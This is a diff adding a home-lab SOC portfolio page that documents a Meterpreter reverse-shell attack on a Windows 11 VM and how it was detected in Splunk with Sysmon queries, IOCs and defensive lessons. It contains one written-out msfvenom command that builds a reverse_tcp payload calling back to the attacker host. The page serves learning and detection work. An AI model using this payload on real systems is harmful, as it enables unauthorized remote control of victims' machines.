@@ -1,0 +1,436 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Attack 3: Exploitation & C2 | HomeSOC Portfolio</title>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Fira+Code:wght@400;500&display=swap"
+        rel="stylesheet">
+    <style>
+        :root {
+            --bg-main: #0B0F19;
+            --bg-card: #151A28;
+            --accent-primary: #00FF9D;
+            --accent-secondary: #00D2FF;
+            --text-main: #E2E8F0;
+            --text-muted: #94A3B8;
+            --border-color: #232B3E;
+            --font-heading: 'Inter', sans-serif;
+            --font-mono: 'Fira Code', monospace;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background-color: var(--bg-main);
+            color: var(--text-main);
+            font-family: var(--font-heading);
+            line-height: 1.6;
+        }
+
+        nav {
+            background: var(--bg-card);
+            border-bottom: 1px solid var(--border-color);
+            padding: 1rem 2rem;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 1rem;
+        }
+
+        nav a {
+            color: var(--text-muted);
+            text-decoration: none;
+            margin-right: 1rem;
+            font-weight: 500;
+            font-size: 0.9rem;
+            transition: all 0.3s ease;
+            padding: 0.4rem 0.8rem;
+            border-radius: 4px;
+        }
+
+        nav a:hover,
+        nav a.active {
+            color: var(--bg-main);
+            background: var(--accent-primary);
+            box-shadow: 0 0 15px rgba(0, 255, 157, 0.4);
+        }
+
+        .logo {
+            font-weight: 700;
+            font-size: 1.4rem;
+            color: var(--text-main);
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            letter-spacing: 1px;
+        }
+
+        .logo span {
+            color: var(--accent-primary);
+        }
+
+        .container {
+            max-width: 1000px;
+            margin: 3rem auto;
+            padding: 0 2rem;
+        }
+
+        .header {
+            margin-bottom: 3rem;
+            border-bottom: 1px solid var(--border-color);
+            padding-bottom: 2rem;
+        }
+
+        .header h1 {
+            font-size: 2.8rem;
+            margin-bottom: 1rem;
+            background: linear-gradient(90deg, var(--accent-primary), var(--accent-secondary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            letter-spacing: -1px;
+        }
+
+        .meta {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 1.5rem;
+            color: var(--text-muted);
+            font-size: 0.9rem;
+            margin-top: 1rem;
+            background: rgba(0, 0, 0, 0.2);
+            padding: 1rem;
+            border-radius: 8px;
+            border: 1px solid var(--border-color);
+        }
+
+        .meta-item {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .meta-item strong {
+            color: var(--accent-secondary);
+        }
+
+        .card {
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            padding: 2rem;
+            margin-bottom: 2rem;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 4px;
+            height: 100%;
+            background: var(--accent-primary);
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+
+        .card:hover::before {
+            opacity: 1;
+        }
+
+        .card:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 30px rgba(0, 255, 157, 0.1);
+            border-color: rgba(0, 255, 157, 0.3);
+        }
+
+        .card h2 {
+            color: #fff;
+            margin-bottom: 1.5rem;
+            font-size: 1.5rem;
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+        }
+
+        .card h2::before {
+            content: '';
+            display: inline-block;
+            width: 12px;
+            height: 12px;
+            background: var(--accent-secondary);
+            border-radius: 50%;
+            box-shadow: 0 0 10px var(--accent-secondary);
+        }
+
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 1.5rem;
+            margin-bottom: 1.5rem;
+        }
+
+        .stat-box {
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid var(--border-color);
+            padding: 1.25rem;
+            border-radius: 8px;
+            border-left: 3px solid var(--accent-primary);
+            transition: all 0.2s;
+        }
+
+        .stat-box.red {
+            border-left-color: #ff3366;
+        }
+
+        .stat-box.purple {
+            border-left-color: #b000ff;
+        }
+
+        .stat-box.orange {
+            border-left-color: #ff8800;
+        }
+
+        .stat-box .label {
+            font-size: 0.8rem;
+            color: var(--text-muted);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 0.5rem;
+        }
+
+        .stat-box .val {
+            font-family: var(--font-mono);
+            font-size: 1.1rem;
+            color: var(--text-main);
+            word-break: break-all;
+        }
+
+        pre {
+            background: #090B10;
+            padding: 1.5rem;
+            border-radius: 8px;
+            overflow-x: auto;
+            border: 1px solid var(--border-color);
+            font-family: var(--font-mono);
+            font-size: 0.9rem;
+            color: #A6ACCD;
+            margin: 1rem 0;
+            box-shadow: inset 0 2px 10px rgba(0, 0, 0, 0.5);
+        }
+
+        code.spl {
+            color: var(--accent-primary);
+        }
+
+        .placeholder-img {
+            width: 100%;
+            height: 350px;
+            background: rgba(0, 255, 157, 0.03);
+            border: 2px dashed rgba(0, 255, 157, 0.2);
+            border-radius: 8px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            color: var(--accent-primary);
+            font-family: var(--font-mono);
+            margin: 1.5rem 0;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-align: center;
+        }
+
+        .placeholder-img svg {
+            width: 48px;
+            height: 48px;
+            margin-bottom: 1rem;
+            opacity: 0.5;
+        }
+
+        .placeholder-img:hover {
+            background: rgba(0, 255, 157, 0.08);
+            border-color: var(--accent-primary);
+        }
+
+        .tag {
+            display: inline-block;
+            padding: 0.2rem 0.6rem;
+            background: rgba(0, 255, 157, 0.1);
+            color: var(--accent-primary);
+            border-radius: 4px;
+            font-size: 0.8rem;
+            font-weight: 600;
+            margin-right: 0.5rem;
+            margin-bottom: 0.5rem;
+            border: 1px solid rgba(0, 255, 157, 0.2);
+        }
+
+        .mitre-tag {
+            background: rgba(0, 210, 255, 0.1);
+            color: var(--accent-secondary);
+            border-color: rgba(0, 210, 255, 0.2);
+        }
+
+        li {
+            margin-bottom: 0.5rem;
+            margin-left: 1.5rem;
+        }
+
+        p {
+            margin-bottom: 1rem;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 1.5rem 0;
+        }
+
+        th,
+        td {
+            padding: 1rem;
+            text-align: left;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        th {
+            background: rgba(0, 0, 0, 0.2);
+            color: var(--text-main);
+            font-weight: 600;
+        }
+
+        td {
+            color: var(--text-muted);
+        }
+    </style>
+</head>
+
+<body>
+    <nav>
+        <div class="logo">Home<span>SOC</span> Lab</div>
+        <div class="links">
+            <a href="index.html">Home</a>
+            <a href="attack1.html">Attack 1: Nmap</a>
+            <a href="attack2.html">Attack 2: Brute Force</a>
+            <a href="attack3.html" class="active">Attack 3: Exploitation</a>
+            <a href="attack4.html">Attack 4: PowerShell LotL</a>
+            <a href="attack5.html">Attack 5: PrivEsc</a>
+            <a href="dashboard.html">Dashboards</a>
+
+        </div>
+    </nav>
+    <div class="container">
+        <div class="header">
+            <h1>Phase 3: Exploitation and Command and Control</h1>
+            <p style="color: var(--text-muted); font-size: 1.15rem; margin-bottom: 0.5rem;">Establishing a Remote Meterpreter Session</p>
+            <div class="meta">
+                <div class="meta-item"><strong>Report ID:</strong> HSOC-003</div>
+                <div class="meta-item"><strong>Tactic:</strong> Execution + Command and Control (C2)</div>
+                <div class="meta-item"><strong>MITRE ATT&CK:</strong> <span class="tag mitre-tag">T1059.001</span>
+                    PowerShell / <span class="tag mitre-tag">T1071.001</span> Web Protocols</div>
+            </div>
+        </div>
+
+        <div class="card">
+            <h2>Attack Overview</h2>
+    <p>Brute forcing is loud, so I moved on to a more direct method for this phase. I created a custom executable that would give me a reverse shell once it was run on the target. This allowed me to control the Windows 11 system remotely from my Kali terminal using the Metasploit Framework. It is a powerful way to establish a stable connection for further attacks.</p>
+
+            <div class="grid" style="grid-template-columns: repeat(3, 1fr);">
+                <div class="stat-box red">
+                    <div class="label">Attacker (Kali VM)</div>
+                    <div class="val">192.168.56.104</div>
+                </div>
+                <div class="stat-box">
+                    <div class="label">Target (Windows 11)</div>
+                    <div class="val">192.168.56.101</div>
+                </div>
+                <div class="stat-box purple">
+                    <div class="label">Listener Port</div>
+                    <div class="val">4444 (TCP)</div>
+                </div>
+            </div>
+
+            <h3 style="margin-top: 1.5rem;">Tools Used</h3>
+            <ul>
+                <li><strong>msfvenom:</strong> Payload generator</li>
+                <li><strong>Metasploit Framework (msfconsole):</strong> Handler / Listener</li>
+            </ul>
+        </div>
+
+        <div class="card">
+            <h2>Execution Details</h2>
+    <p>I started by building the malicious payload on my Kali machine. I used msfvenom to create an x64 executable that connects back to my IP on port 4444.</p>
+    <pre><code class="spl">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.104 LPORT=4444 -f exe -o payload.exe</code></pre>
+
+    <p>I moved the payload.exe file to the Windows computer and set up a listener in Metasploit to wait for the connection. As soon as I ran the file on the target, I got an active session. This gave me full access to browse files and run commands on the remote system.</p>
+
+            <img src="meterpreter_payload.jpg" alt="Meterpreter Payload Customization" style="width: 100%; border-radius: 8px; border: 1px solid var(--border-color); margin: 1.5rem 0; box-shadow: 0 4px 20px rgba(0,0,0,0.3);">
+        </div>
+
+<div class="card">
+    <h2>SIEM Detection and Payload Tracking</h2>
+    <p>This attack leaves a trail in the Sysmon logs that is very different from a normal user. I focused on tracking two specific events: the creation of the process and the outbound network connection it made immediately after.</p>
+
+    <h3>1. Detecting Suspicious Process Creation (Event Code 1)</h3>
+    <p>I used this query to find any process named payload.exe that was started on the system. In a real environment, you would look for any unknown executable running from a user directory.</p>
+    <pre><code class="spl">index=homesoc_sysmon EventCode=1 
+| search Image="*payload.exe*" OR OriginalFileName="payload.exe"</code></pre>
+
+    <h3>2. Tracking Outbound C2 Traffic (Event Code 3)</h3>
+    <p>This query looks for network connections made by the payload. It is very suspicious when a new process tries to connect to an external IP on a non-standard port like 4444.</p>
+    <pre><code class="spl">index=homesoc_sysmon EventCode=3 
+| where Image="*payload.exe*" AND DestinationPort=4444</code></pre>
+
+    <h3>Correlation Strategy</h3>
+    <p>I created a dashboard that correlates these two events. If a new process starts and then immediately opens a network connection, it is almost certainly a reverse shell.</p>
+    <p>The logic monitors for:</p>
+    <ul>
+        <li>Creation of an untrusted binary (Event Code 1)</li>
+        <li>Network activity from that specific binary (Event Code 3)</li>
+    </ul>
+
+    <h3>Combined Correlation SPL</h3>
+    <pre><code class="spl">index=homesoc_sysmon EventCode=1 Image="*payload.exe*" 
+| join Image [search index=homesoc_sysmon EventCode=3 DestPort=4444]</code></pre>
+
+            <img src="splunk_attack3.jpg" alt="Splunk Event Review" style="width: 100%; border-radius: 8px; border: 1px solid var(--border-color); margin: 1.5rem 0; box-shadow: 0 4px 20px rgba(0,0,0,0.3);">
+
+            <h3>Key Indicators of Compromise (IOCs)</h3>
+            <ul>
+                <li><strong>Sysmon Event ID 1:</strong> Process creation of payload.exe</li>
+                <li><strong>Sysmon Event ID 3:</strong> Outbound connection to port 4444 from a newly created executable
+                </li>
+                <li><strong>Source IP:</strong> 192.168.56.101 (Victim)</li>
+                <li><strong>Destination IP:</strong> 192.168.56.104 (Attacker)</li>
+                <li><strong>File Name:</strong> payload.exe</li>
+            </ul>
+
+    <h3 style="margin-top: 2rem;">Analyst Notes and Lessons Learned</h3>
+    <p>The sequence of a new process starting and immediately connecting to a remote IP is a classic signature of a reverse shell. In this lab, the pattern stood out clearly because there was no other traffic on port 4444.</p>
+    <p>This phase highlighted the importance of a few key defenses:</p>
+    <ul>
+        <li>EDR tools can automatically kill processes that try to open suspicious network connections.</li>
+        <li>Whitelisting only approved applications would have stopped the payload from running at all.</li>
+        <li>Blocking common attack ports like 4444 at the network level is a simple but effective layer of security.</li>
+    </ul>
+</div>
+
+    </div>
+</body>
+
+</html>
